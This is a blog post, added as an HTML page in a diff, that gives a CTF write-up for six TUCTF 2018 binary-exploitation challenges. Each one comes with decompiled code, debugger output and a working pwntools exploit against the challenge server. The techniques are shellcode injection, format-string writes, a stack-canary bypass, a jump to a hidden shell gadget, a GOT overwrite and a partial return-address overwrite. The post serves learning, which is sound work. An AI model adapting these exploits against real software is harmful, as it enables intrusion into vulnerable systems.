@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		
+		<meta name="author" content="Alan Chang">
+		<meta name="description" content="a random blog about cybersecurity and programming">
+		<meta name="generator" content="Hugo 0.51" />
+		<title>TUCTF 2018 Writeup &middot; Alan&#39;s Blog</title>
+		<link rel="shortcut icon" href="https://tcode2k16.github.io/blog/images/favicon.ico">
+		<link rel="stylesheet" href="https://tcode2k16.github.io/blog/css/style.css">
+		<link rel="stylesheet" href="https://tcode2k16.github.io/blog/css/highlight.css">
+
+		
+		<link rel="stylesheet" href="https://tcode2k16.github.io/blog/css/font-awesome.min.css">
+		
+
+		
+		<link href="https://tcode2k16.github.io/blog/index.xml" rel="alternate" type="application/rss+xml" title="Alan&#39;s Blog" />
+		
+
+		
+	</head>
+
+    <body>
+       <nav class="main-nav">
+	
+	
+		<a href='https://tcode2k16.github.io/blog/'> <span class="arrow">←</span>Home</a>
+	
+	<a href='https://tcode2k16.github.io/blog/posts'>Archive</a>
+	<a href='https://tcode2k16.github.io/blog/tags'>Tags</a>
+	<a href='https://tcode2k16.github.io/blog/about'>About</a>
+
+	
+
+	
+	<a class="cta" href="https://tcode2k16.github.io/blog/index.xml">Subscribe</a>
+	
+</nav>
+
+
+        <section id="wrapper" class="post">
+            <article>
+                <header>
+                    <h1>
+                        TUCTF 2018 Writeup
+                    </h1>
+                    <h2 class="headline">
+                    Nov 26, 2018 08:09
+                    · 1653 words
+                    · 8 minute read
+                      <span class="tags">
+                      
+                      
+                          
+                              <a href="https://tcode2k16.github.io/blog/tags/ctf">ctf</a>
+                          
+                              <a href="https://tcode2k16.github.io/blog/tags/cyber-security">cyber-security</a>
+                          
+                              <a href="https://tcode2k16.github.io/blog/tags/write-up">write-up</a>
+                          
+                      
+                      
+                      </span>
+                    </h2>
+                </header>
+                
+                  
+                    <div id="toc">
+                      <nav id="TableOfContents">
+<ul>
+<li><a href="#shella-easy">Shella Easy</a>
+<ul>
+<li><a href="#problem">Problem</a></li>
+<li><a href="#solution">Solution</a></li>
+</ul></li>
+<li><a href="#ehh">Ehh</a>
+<ul>
+<li><a href="#problem-1">Problem</a></li>
+<li><a href="#solution-1">Solution</a></li>
+</ul></li>
+<li><a href="#canary">Canary</a>
+<ul>
+<li><a href="#problem-2">Problem</a></li>
+<li><a href="#solution-2">Solution</a></li>
+</ul></li>
+<li><a href="#shella-hard">Shella Hard</a>
+<ul>
+<li><a href="#problem-3">Problem</a></li>
+<li><a href="#solution-3">Solution</a></li>
+</ul></li>
+<li><a href="#timber">Timber</a>
+<ul>
+<li><a href="#problem-4">Problem</a></li>
+<li><a href="#solution-4">Solution</a></li>
+</ul></li>
+<li><a href="#lisa">Lisa</a>
+<ul>
+<li><a href="#problem-5">Problem</a></li>
+<li><a href="#solution-5">Solution</a></li>
+</ul></li>
+</ul>
+</nav>
+                    </div>
+                  
+                
+                <section id="post-body">
+                    
+
+<h1 id="shella-easy">Shella Easy</h1>
+
+<h2 id="problem">Problem</h2>
+
+<p>Difficulty: easy-ish
+Want to be a drive-thru attendant?
+Well, no one does&hellip; But! the best employee receives their very own flag!
+whatdya say?</p>
+
+<p>nc 52.15.182.55 12345</p>
+
+<p><a href="/blog/2018/tuctf-writeup/Shella Easy/shella-easy">shella-easy</a></p>
+
+<h2 id="solution">Solution</h2>
+
+<p>Let&rsquo;s take a look at the <code>main</code> function:</p>
+
+<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char s; // [esp+0h] [ebp-48h]
+  int v5; // [esp+40h] [ebp-8h]
+
+  setvbuf(stdout, 0, 2, 0x14u);
+  setvbuf(stdin, 0, 2, 0x14u);
+  v5 = -889275714;
+  printf(&quot;Yeah I'll have a %p with a side of fries thanks\n&quot;, &amp;s);
+  gets(&amp;s);
+  if ( v5 != -559038737 )
+    exit(0);
+  return 0;
+}
+</code></pre>
+
+<p>As you can see, we have a memory leak with the <code>printf</code> call and a buffer overflow with the <code>gets</code> call. Furthermore, <a href="https://en.wikipedia.org/wiki/NX_bit">NX</a> is not enabled for the binary, and the stack is readable, writable, and executable:</p>
+
+<pre><code>$ r2 -d ./shella-easy
+...
+[0xf7ed8c70]&gt; i
+...
+nx       false
+...
+[0xf7ed8c70]&gt; dm
+...
+0xffddb000 - 0xffdfd000 - usr   136K s rwx [stack] [stack] ; map.stack_.rwx
+</code></pre>
+
+<p>So our objective is to first overwrite the <code>v5</code> variable to equal to <code>-559038737</code> or <code>0xDEADBEEF</code> in hex. You can do the signed integer to hex conversion using a <a href="http://www.binaryconvert.com/convert_signed_int.html">online tool</a> or just python.</p>
+
+<p>Then we can control the <code>eip</code> register and execute a shellcode than is placed on the stack with our input.</p>
+
+<p>In conclusion, this is how our payload should look like:</p>
+
+<ul>
+<li>shellcode</li>
+<li>padding to 0x40 bytes</li>
+<li>0xDEADBEEF &lt;&ndash; overwrite <code>v5</code></li>
+<li>8 bytes padding</li>
+<li>the leaked stack address that points to our shellcode</li>
+</ul>
+
+<p>Here is the exploit in python:</p>
+
+<pre><code class="language-python">from pwn import *
+
+# sh = process('./shella-easy')
+sh = remote('52.15.182.55', 12345)
+addr = sh.recvuntil('thanks\n').split(' ')[4][2:]
+addr = int(addr, 16)
+
+shellcode = asm(shellcraft.i386.linux.sh())
+
+payload = ''
+payload += shellcode
+payload += 'a'*(0x40-len(shellcode))
+payload += p32(0xDEADBEEF) # -559038737
+payload += 'a'*8
+payload += p32(addr)
+
+sh.sendline(payload)
+sh.interactive()
+</code></pre>
+
+<p>flag: <code>TUCTF{1_607_4_fl46_bu7_n0_fr135}</code></p>
+
+<h1 id="ehh">Ehh</h1>
+
+<h2 id="problem-1">Problem</h2>
+
+<p>Difficulty: easy
+Whatever&hellip; I dunno</p>
+
+<p>nc 18.222.213.102 12345</p>
+
+<p><a href="/blog/2018/tuctf-writeup/Ehh/ehh">ehh</a></p>
+
+<h2 id="solution-1">Solution</h2>
+
+<p>This is a simple format string attack using <code>printf</code> and <code>%n</code>.</p>
+
+<p>We have to overwrite a given address with <code>0x18</code>. Here is the exploit:</p>
+
+<pre><code class="language-python">from pwn import *
+
+# sh = process('./ehh')
+sh = remote('18.222.213.102', 12345)
+
+addr = int(sh.recvuntil('\n').split(' ')[-1][2:], 16)
+
+payload = ''
+payload += p32(addr)
+payload += '%{}x'.format(0x18-4)
+payload += '%6$n'
+
+# for i in range(4,100):
+#     payload += '%{}$x '.format(i)
+
+sh.sendline(payload)
+
+sh.interactive()
+</code></pre>
+
+<p>flag: <code>TUCTF{pr1n7f_15_pr377y_c00l_huh}</code></p>
+
+<h1 id="canary">Canary</h1>
+
+<h2 id="problem-2">Problem</h2>
+
+<p>Difficulty: easy
+I can fix overflows easy! I&rsquo;ll just make my own stack canary no problem.
+Just try and pwn this, I dare you</p>
+
+<p>nc 18.222.227.1 12345</p>
+
+<p><a href="/blog/2018/tuctf-writeup/Canary/canary">canary</a></p>
+
+<h2 id="solution-2">Solution</h2>
+
+<p>For this problem we have to defeat a custom implementation of a stack canary.</p>
+
+<p>After some reversing of the binary. We can see that, basically, this is how the stack looks like:</p>
+
+<ul>
+<li>40 bytes of input &lt;&ndash; esp</li>
+<li>4 bytes of canary from <code>/dev/urandom</code></li>
+<li>index counter to the copy of the canary in <code>.bss</code></li>
+<li>other stuff</li>
+</ul>
+
+<p>Looking at this, we can see that if we overwrite the canary alone, the <code>checkCanary</code> will just exit:</p>
+
+<pre><code>int __cdecl checkCanary(int canary)
+{
+  int result; // eax
+
+  result = *(_DWORD *)(canary + 40);
+  if ( result != cans[*(_DWORD *)(canary + 44)] )
+  {
+    puts(&quot;---------------------- HEY NO STACK SMASHING! --------------------&quot;);
+    exit(1);
+  }
+  return result;
+}
+</code></pre>
+
+<p>So, we have to change the index counter as well. Because the <code>cans</code> global array is located inside the <code>.bss</code> section, we know that it is initialized with <code>0x00</code>, and we are able to input null bytes through the <code>read</code> call in <code>doCanary</code>:</p>
+
+<pre><code>int __cdecl doCanary(void *buf)
+{
+  initCanary((canary *)buf);
+  read(0, buf, 0x1A4u);
+  return checkCanary((int)buf);
+}
+</code></pre>
+
+<p>So in summary, we can overwrite the canary with null bytes and change the index counter to something that is larger than zero which will just point to a random place in <code>.bss</code>. Then both pointers to the canary will point to 4 null bytes, and the stack smashing detection would be bypassed. After bypassing the canary, we can just take control of <code>eip</code> and print out the flag.</p>
+
+<p>Here is the exploit in python:</p>
+
+<pre><code class="language-python">from pwn import *
+
+# sh = process('./canary')
+sh = remote('18.222.227.1', 12345)
+
+win = 0x080486b7
+
+payload = 'a'*40
+payload += '\x00'*4
+payload += p32(2)
+payload += p32(win)*10 # just to make sure :)
+
+sh.sendlineafter('? ', payload)
+sh.interactive()
+</code></pre>
+
+<p>flag: <code>TUCTF{n3v3r_r0ll_y0ur_0wn_c4n4ry}</code></p>
+
+<h1 id="shella-hard">Shella Hard</h1>
+
+<h2 id="problem-3">Problem</h2>
+
+<p>Difficulty: mind-melting hard
+This program is crap! Is there even anything here?</p>
+
+<p>nc 3.16.169.157 12345</p>
+
+<p><a href="/blog/2018/tuctf-writeup/Shella Hard/shella-hard">shella-hard</a></p>
+
+<h2 id="solution-3">Solution</h2>
+
+<p>Unlike <a href="#shella-easy">Shella Easy</a>, this time NX is enabled, and we only have a 14 bytes overflow which is not enough for a ROP chain to call <code>execve</code>:</p>
+
+<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char buf; // [esp+0h] [ebp-10h]
+
+  read(0, &amp;buf, 0x1Eu);
+  return 0;
+}
+</code></pre>
+
+<p>However, we have a function named <code>giveShell</code>:</p>
+
+<pre><code>$ r2 ./shella-hard
+[0x08048340]&gt; aaaa
+[0x08048340]&gt; pdf @ sym.giveShell
+/ (fcn) sym.giveShell 26
+|   sym.giveShell ();
+|           0x08048458      55             push ebp
+|           0x08048459      89e5           mov ebp, esp
+|           0x0804845b      90             nop
+|           0x0804845c      a1446a006a     mov eax, dword [0x6a006a44] ; [0x6a006a44:4]=-1
+|           0x08048461      006800         add byte [eax], ch
+|           0x08048464      850408         test dword [eax + ecx], eax ; [0x13:4]=-1 ; 19
+|           0x08048467      e8b4feffff     call sym.imp.execve
+|           0x0804846c      83c40c         add esp, 0xc
+|           0x0804846f      90             nop
+|           0x08048470      c9             leave
+\           0x08048471      c3             ret
+</code></pre>
+
+<p>Looking at the assembly, the function looks a bit off. We don&rsquo;t usually see a <code>test</code> instruction in from tof a <code>call</code> instruction.</p>
+
+<p>Inspired by the hint: &ldquo;read between the lines. If you know what I mean&rdquo;, I decided to disassemble the function with a certain offset:</p>
+
+<pre><code>[0x08048340]&gt; pd 8 @ sym.giveShell+6
+|           0x0804845e      6a00           push 0
+|           0x08048460      6a00           push 0
+|           0x08048462      6800850408     push str.bin_sh             ; 0x8048500 ; &quot;/bin/sh&quot;
+|           0x08048467      e8b4feffff     call sym.imp.execve
+|           0x0804846c      83c40c         add esp, 0xc
+|           0x0804846f      90             nop
+|           0x08048470      c9             leave
+\           0x08048471      c3             ret
+</code></pre>
+
+<p>And there we have it, a rop gadget that will open a shell for us. All we have to do is to overwrite the ret pointer to <code>0x0804845e</code>, and we are set.</p>
+
+<p>Here is the python exploit:</p>
+
+<pre><code class="language-python">from pwn import *
+
+# sh = process('./shella-hard')
+sh = remote('3.16.169.157', 12345)
+
+giveShell = 0x08048458
+
+payload = 'a'*20
+payload += p32(giveShell+6)
+
+sh.sendline(payload)
+
+sh.interactive()
+</code></pre>
+
+<p>flag: <code>TUCTF{175_wh475_1n51d3_7h47_c0un75}</code></p>
+
+<h1 id="timber">Timber</h1>
+
+<h2 id="problem-4">Problem</h2>
+
+<p>Difficulty: easy
+Are you a single lumberjack tired of striking out?
+Well not with Timber!
+Our deep learning neural network is sure to find a perfect match for you. Try Timber today!</p>
+
+<p>nc 18.222.250.47 12345</p>
+
+<p><a href="/blog/2018/tuctf-writeup/Timber/timber">timber</a></p>
+
+<h2 id="solution-4">Solution</h2>
+
+<p>This is a hard version of <a href="#ehh">Ehh</a>. We have to again use a format string attack to overwrite some values. This time, we have to overwrite the GOT entry table and call the <code>date</code> function which is, in fact, a win function.</p>
+
+<p>Here is the python exploit:</p>
+
+<pre><code class="language-python">from pwn import *
+
+# sh = process('./timber')
+sh = remote('18.222.250.47', 12345)
+
+print sh.recvuntil('name: ')
+
+puts_GOT = 0x804b01c
+win_addr = 0x0804867b
+
+payload = ''
+payload += p32(puts_GOT)
+payload += p32(puts_GOT+2)
+payload += '%{}x'.format(0x0804-8)
+payload += '%3$hn'
+payload += '%{}x'.format(0x867b-0x0804)
+payload += '%2$hn'
+
+# for i in range(0,100):
+#     payload += '%{}$x '.format(i)
+
+sh.sendline(payload)
+
+sh.interactive()
+</code></pre>
+
+<p>For more explanation on format string attacks, you can check out my <a href="/blog/posts/picoctf-2018-writeup/binary-exploitation/">picoCTF 2018 writeup</a>.</p>
+
+<p>flag: <code>TUCTF{wh0_64v3_y0u_7h47_c4n4ry}</code></p>
+
+<h1 id="lisa">Lisa</h1>
+
+<h2 id="problem-5">Problem</h2>
+
+<p>Difficulty: medium-ish
+Ayo, Johhny&rsquo;s got your take from the job.
+Go meet up with em&rsquo; to claim your share.
+Oh, and stop asking to see the Mona Lisa alright. It&rsquo;s embarrassing</p>
+
+<p>nc 18.191.244.121 12345</p>
+
+<p><a href="/blog/2018/tuctf-writeup/Lisa/lisa">lisa</a></p>
+
+<h2 id="solution-5">Solution</h2>
+
+<p>This to me is the more interesting pwn challenge in this CTF.</p>
+
+<p>Basically, you get a address leak to the password buffer and a buffer overflow in the <code>fail</code> function that allows you to change the least significant byte of the return address:</p>
+
+<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char input; // [esp+0h] [ebp-34h]
+
+  setvbuf(stdout, 0, 2, 0x14u);
+  setvbuf(stdin, 0, 2, 0x14u);
+  memset(&amp;input, 0, 0x30u);
+  pass = malloc(0x2Bu);
+  printf(&quot;Here's your share: %p\n&quot;, pass);
+  puts(&quot;What? The Mona Lisa!\nLook, if you want somethin' from me, I'm gonna need somethin' from you alright...&quot;);
+  read(0, &amp;input, 0x30u);
+  inp = &amp;input;
+  pfd = open(&quot;./password&quot;, 0);
+  read(pfd, pass, 0x2Bu);
+  checkPass();
+  return 0;
+}
+
+int checkPass()
+{
+  int result; // eax
+  char buf; // [esp+0h] [ebp-18h]
+
+  if ( doStrcmp(inp, (char *)pass) )
+    result = lisa();
+  else
+    result = fail(&amp;buf);
+  return result;
+}
+
+ssize_t __cdecl fail(void *buf)
+{
+  puts(&quot;Ugh! You kiss your mother with that mouth?&quot;);
+  return read(0, buf, 29u);
+}
+</code></pre>
+
+<p>Using this overflow, we have to somehow call the <code>lisa</code> function that will print out the flag.</p>
+
+<p>Because we can only control the least significant byte, our option is pretty limited:</p>
+
+<pre><code>$ r2 ./lisa
+[0x000005f0]&gt; aaaa
+[0x000005f0]&gt; s sym.main
+[0x00000c40]&gt; pdf
+...
+|           0x00000d01      8d8340000000   lea eax, [ebx + 0x40]       ; &quot;4&quot; ; '@'
+|           0x00000d07      8b10           mov edx, dword [eax]
+|           0x00000d09      8d8348000000   lea eax, [ebx + 0x48]       ; 'H'
+|           0x00000d0f      8b00           mov eax, dword [eax]
+|           0x00000d11      6a2b           push 0x2b                   ; '+' ; size_t nbyte
+|           0x00000d13      52             push edx                    ; void *buf
+|           0x00000d14      50             push eax                    ; int fildes
+|           0x00000d15      e836f8ffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
+|           0x00000d1a      83c40c         add esp, 0xc
+|           0x00000d1d      e89cfaffff     call sym.checkPass
+|           0x00000d22      b800000000     mov eax, 0
+|           0x00000d27      8b5dfc         mov ebx, dword [local_4h]
+|           0x00000d2a      c9             leave
+\           0x00000d2b      c3             ret
+</code></pre>
+
+<p>Here are all the places that we can jump to. However, because it is a 32 bit binary and our buffer is the first thing on the stack, we can use our input to pass arguments to functions which is a plus.</p>
+
+<p>Using both the stack layout and our overflow, we can jump to <code>0x00000d15</code> and supply the arguments for the <code>read</code> call using our input.</p>
+
+<p>So if we can write to the password buffer and make it identical to the input buffer, we can then get the flag.</p>
+
+<p>Here is the python code that does that:</p>
+
+<pre><code class="language-python">from pwn import *
+
+# sh = process('./lisa')
+sh = remote('18.191.244.121', 12345)
+pass_addr = int(sh.recvuntil('...\n').split('\n')[0].split(' ')[-1][2:], 16)
+print hex(pass_addr)
+pause()
+
+payload = p32(0)
+payload += p32(pass_addr)
+payload += p32(0x1d)
+sh.sendline(payload)
+
+payload = 'a'*0x18
+payload += 'a'*4
+payload += '\x15'
+sh.sendafter('mouth?\n', payload)
+
+payload = p32(0)
+payload += p32(pass_addr)
+payload += p32(0x1d)
+sh.sendline(payload)
+
+sh.interactive()
+</code></pre>
+
+<p>flag: <code>TUCTF{wh0_pu7_7h47_buff3r_7h3r3?}</code></p>
+
+                </section>
+            </article>
+
+            
+
+            
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'github-blog-14'; 
+
+     
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+            
+
+            
+
+            <footer id="footer">
+    
+        <div id="social">
+
+	
+	
+    <a class="symbol" href="https://www.github.com/tcode2k16">
+        <i class="fa fa-github-square"></i>
+    </a>
+    
+
+
+</div>
+
+    
+    <p class="small">
+    
+       © Copyright 2018 <i class="fa fa-heart" aria-hidden="true"></i> Alan Chang
+    
+    </p>
+    <p class="small">
+        Powered by <a href="http://www.gohugo.io/">Hugo</a> Theme By <a href="https://github.com/nodejh/hugo-theme-cactus-plus">nodejh</a>
+    </p>
+</footer>
+
+        </section>
+
+        <script src="https://tcode2k16.github.io/blog/js/jquery-3.3.1.min.js"></script>
+<script src="https://tcode2k16.github.io/blog/js/main.js"></script>
+<script src="https://tcode2k16.github.io/blog/js/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-88069322-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+
+
+    </body>
+</html>
